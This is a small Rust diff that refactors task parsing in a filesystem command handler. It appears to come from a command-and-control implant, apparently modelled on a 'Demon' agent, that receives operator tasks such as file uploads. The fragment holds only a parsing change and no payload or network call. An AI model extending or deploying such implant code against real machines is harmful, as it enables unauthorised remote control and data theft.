@@ -23,8 +23,7 @@ pub(super) async fn execute_filesystem(
     state: &mut PhantomState,
 ) -> Result<(), PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let subcommand = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative filesystem subcommand"))?;
+    let subcommand = parser.uint32()?;
     let subcommand = DemonFilesystemCommand::try_from(subcommand)?;
 
     match subcommand {
@@ -95,8 +94,7 @@ pub(super) async fn execute_filesystem(
         }
         DemonFilesystemCommand::Upload => {
             let path = normalize_path(&parser.wstring()?);
-            let mem_file_id = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
+            let mem_file_id = parser.uint32()?;
             let Some(mem_file) = state.mem_files.get(&mem_file_id) else {
                 state.queue_callback(PendingCallback::Error {
                     request_id,
